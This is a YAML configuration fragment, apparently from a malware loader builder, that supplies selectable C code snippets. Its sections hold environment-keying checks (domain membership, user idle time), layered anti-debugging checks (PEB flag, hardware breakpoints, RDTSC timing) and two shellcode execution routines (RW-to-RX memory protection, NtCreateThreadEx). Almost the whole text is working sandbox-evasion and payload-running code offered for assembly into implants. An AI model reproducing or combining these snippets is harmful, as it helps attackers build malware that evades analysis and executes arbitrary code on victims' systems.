  # GUARDRAILS - Environment Keying
  # --------------------------------------------------------------------------
  - header: "Guardrails"
    template: "guardrail"
    display: "Guardrails"
    allowMultiple: true
    items:
      - id: "None"
        display: "None (Skip)"
        default: true
        snippet: |
          // No guardrails

      - id: "DomainJoined"
        display: "Require Domain Membership"
        default: false
        snippet: |
          {
              WCHAR domain[256];
              DWORD size = 256;
              NETSETUP_JOIN_STATUS status;
              if (NetGetJoinInformation(NULL, (LPWSTR*)&domain, &status) == NERR_Success) {
                  if (status != NetSetupDomainName) {
                      NetApiBufferFree(domain);
                      return 0;
                  }
                  NetApiBufferFree(domain);
              }
          }

      - id: "UserActivity"
        display: "User Activity Required"
        default: false
        snippet: |
          // Require mouse movement history
          {
              LASTINPUTINFO lii = {sizeof(lii)};
              if (GetLastInputInfo(&lii)) {
                  DWORD idle = (GetTickCount() - lii.dwTime) / 1000;
                  // If idle > 1 hour, suspicious
                  if (idle > 3600) return 0;
              }
          }

  # --------------------------------------------------------------------------
  # ANTI-DEBUGGING - Layered Detection
  # --------------------------------------------------------------------------
  - header: "Anti Debugging"
    template: "antidebugging"
    display: "Anti-Debugging"
    allowMultiple: true
    items:
      - id: "LayeredChecks"
        display: "Layered Debugger Detection"
        default: true
        snippet: |
          // Multiple anti-debug checks
          {
              // Check 1: IsDebuggerPresent
              if (IsDebuggerPresent()) return 0;

              // Check 2: Remote debugger
              BOOL remote = FALSE;
              CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
              if (remote) return 0;

              // Check 3: PEB flag
              #ifdef _WIN64
              if (((PPEB)__readgsqword(0x60))->BeingDebugged) return 0;
              #else
              if (((PPEB)__readfsdword(0x30))->BeingDebugged) return 0;
              #endif

              // Check 4: Hardware breakpoints
              CONTEXT ctx = {0};
              ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
              if (GetThreadContext(GetCurrentThread(), &ctx)) {
                  if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return 0;
              }

              // Check 5: Timing
              unsigned __int64 t1 = __rdtsc();
              volatile int x = 0; for (int i = 0; i < 100; i++) x++;
              if (__rdtsc() - t1 > 0x100000) return 0;
          }

  # --------------------------------------------------------------------------
  # SHELLCODE EXECUTION - Stealthy Methods
  # --------------------------------------------------------------------------
  - header: "Shellcode Execution"
    template: "shellcodeexecution"
    display: "Shellcode Execution"
    allowMultiple: false
    items:
      - id: "RWtoRX"
        display: "RW Alloc → RX Protect"
        default: true
        snippet: |
          // Allocate RW, copy, then protect as RX (not RWX)
          {
              void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
              if (!mem) return -1;
              memcpy(mem, code_blob, code_blob_len);
              DWORD old;
              VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);
              ((void(*)())mem)();
              VirtualProtect(mem, code_blob_len, PAGE_READWRITE, &old);
              SecureZeroMemory(mem, code_blob_len);
              VirtualFree(mem, 0, MEM_RELEASE);
          }

      - id: "SyscallExec"
        display: "Direct Syscall Execution"
        default: false
        snippet: |
          // Execute via NtCreateThreadEx (direct syscall)
          {
              typedef NTSTATUS (NTAPI *pNtCTE)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
              void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
              memcpy(mem, code_blob, code_blob_len);
              DWORD old;
              VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);
              
              pNtCTE NtCTE = (pNtCTE)GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateThreadEx");
              HANDLE hThread = NULL;
              if (NtCTE) {
                  NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), mem, NULL, 0, 0, 0, 0, NULL);
                  if (hThread) {
                      WaitForSingleObject(hThread, INFINITE);
                      CloseHandle(hThread);
                  }
              }
              VirtualFree(mem, 0, MEM_RELEASE);
          }

